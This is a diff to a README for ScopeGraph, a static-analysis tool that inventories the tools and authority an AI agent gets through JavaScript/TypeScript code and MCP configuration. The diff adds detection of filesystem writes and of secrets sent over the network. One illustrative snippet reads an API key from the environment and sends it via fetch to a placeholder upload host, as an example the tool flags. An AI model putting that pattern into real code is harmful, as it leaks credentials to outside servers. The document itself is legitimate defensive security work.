@@ -14,7 +14,7 @@ It can also compare two project states and answer a more useful question than �
 
 > **What changed in the agent's effective authority and control surface?**
 
-The current core analyzes JavaScript/TypeScript execution flows, common MCP JSON configuration, MCP SDK tool registrations, Codex instruction files, Claude instruction files, and Agent Skills metadata. It can connect proven MCP tool input to execution sinks, inventory scoped agent instructions without treating free-form prose as proof, and compare tool/instruction state between directories or Git revisions.
+The current core analyzes JavaScript/TypeScript process execution, filesystem mutation, environment reads, and `fetch` network sends; common MCP JSON configuration; MCP SDK tool registrations; Codex instruction files; Claude instruction files; and Agent Skills metadata. It can connect proven untrusted input to execution or filesystem sinks, prove sensitive environment data reaching the network, inventory scoped agent instructions without treating free-form prose as proof, and compare tool/instruction state between directories or Git revisions.
 
 ```text
                          project
@@ -62,10 +62,20 @@ Implemented today:
 - `exec`, `execSync`, `spawn`, and `spawnSync` sinks
 - `exec` / `execSync` modeled as `shell.execute`
 - `spawn` / `spawnSync` modeled as `process.spawn`
+- `node:fs`, `fs`, `node:fs/promises`, and `fs/promises` filesystem-write modeling
+- `writeFile`, `writeFileSync`, `appendFile`, and `appendFileSync` mutation sinks
+- static `process.env.KEY` / `process.env["KEY"]` sensitive-source modeling; values are never retained
+- global `fetch(...)` network-send sinks
+- static fetch destinations reduced to their origin so URL paths, query strings, fragments, and credentials are not retained
 - simple imported-function aliases such as `const run = exec`
-- basic taint propagation through identifiers, properties, assignments, binary expressions, and templates
+- basic taint propagation through identifiers, properties, assignments, binary expressions, templates, object literals, and arrays
+- generic untrusted parameters seeded only from exported function declarations; internal helpers are not assumed agent-controlled
+- MCP handlers use their discovered tool inputs as the untrusted boundary
 - `UNKNOWN` diagnostics for unresolved computed call targets
 - `SG1001` — **Untrusted content reaches shell execution**
+- `SG1101` — **Untrusted content reaches filesystem mutation**
+- `SG1201` — **Sensitive environment data reaches network**
+- authority and findings are intentionally separate: a tool may expose a capability without producing a finding unless a dangerous data-flow path is proven
 
 ### MCP configuration and tools
 
@@ -82,7 +92,10 @@ Implemented today:
 - MCP tool-input discovery from common handler parameter patterns
 - tool annotations retained as metadata without overriding proven code authority
 - partial MCP analysis with `UNKNOWN` diagnostics for dynamic registration config or incomplete syntax
-- proven MCP tool input → `exec` paths attributed back to the exposed tool
+- proven MCP tool input → execution or filesystem-mutation paths attributed back to the exposed tool
+- MCP handler `filesystem.write`, `environment.read`, and `network.send` capability attribution
+- `environment.read` retains only the environment-variable key
+- `network.send` retains only a static destination origin, or `<dynamic>` when a destination cannot be reduced safely
 - per-tool capability inventory in scan reports
 
 ### Agent instruction frontends
@@ -127,7 +140,7 @@ Implemented today:
 - PR gating only when a newly introduced finding is `high` or `critical`
 - Code Scanning SARIF upload for trusted same-repository pull requests
 
-ScopeGraph does **not** claim exhaustive MCP semantics, arbitrary JavaScript metaprogramming support, or semantic understanding of arbitrary Markdown instructions. Dynamic names, unresolved handlers, malformed metadata, and unsupported registration shapes remain conservative `UNKNOWN` territory.
+ScopeGraph does **not** claim exhaustive MCP semantics, arbitrary JavaScript metaprogramming support, or semantic understanding of arbitrary Markdown instructions. Filesystem reads, workspace/path escape analysis, Node `http`/`https` request modeling, richer interprocedural flow, and composed authority remain future layers. Dynamic names, unresolved handlers, malformed metadata, and unsupported registration shapes remain conservative `UNKNOWN` territory.
 
 ## Quick start
 
@@ -206,6 +219,34 @@ Confidence: PROVEN
 ```
 
 Annotations such as `readOnlyHint` are retained as metadata, but they do not suppress authority proved from the implementation. If ScopeGraph can prove the tool and handler while only the registration config is dynamic, it keeps the proven portion and emits an `UNKNOWN` diagnostic for the unresolved metadata/schema portion.
+
+A capability does not imply a vulnerability. For example, a tool that executes a fixed command, writes fixed content, or sends a static health request can still expose `shell.execute`, `filesystem.write`, or `network.send` authority while producing no finding because no dangerous source-to-sink flow was proven.
+
+## Filesystem and sensitive network flows
+
+An exported entrypoint can prove untrusted content reaching a filesystem mutation:
+
+```ts
+import { writeFile } from "node:fs/promises";
+
+export async function save(input: { body: string }) {
+  await writeFile("output.txt", input.body);
+}
+```
+
+That path produces `SG1101`. Internal helper parameters are not treated as agent-controlled merely because they are function parameters.
+
+Sensitive environment data reaching `fetch` can produce `SG1201`:
+
+```ts
+const token = process.env.API_KEY;
+
+await fetch("https://example.test/upload", {
+  headers: { authorization: token },
+});
+```
+
+Only the environment key (`API_KEY`) is retained as sensitive-source identity. When the same behavior is inside a proven MCP tool handler, its static authority can include `environment.read -> API_KEY` and `network.send -> https://example.test`; the secret value and URL path/query are not retained.
 
 ## Agent instruction inventory
 
@@ -352,9 +393,9 @@ ScopeGraph does not execute analyzed source code, imported project modules, MCP 
 
 Planned layers, in order:
 
-1. filesystem, secret-source, and network-send semantics in JavaScript/TypeScript
+1. filesystem-read semantics, Node `http` / `https` sends, and workspace/path-scope analysis (`SG1301`)
 2. richer structured references between agent instructions, skills, MCP tools, and executable code
-3. composed-authority analysis across multiple tools and instruction surfaces
+3. composed-authority analysis across multiple tools and instruction surfaces (`SG1401` family)
 4. interactive local HTML capability graph
 5. package/release hardening and a reusable GitHub Action
 
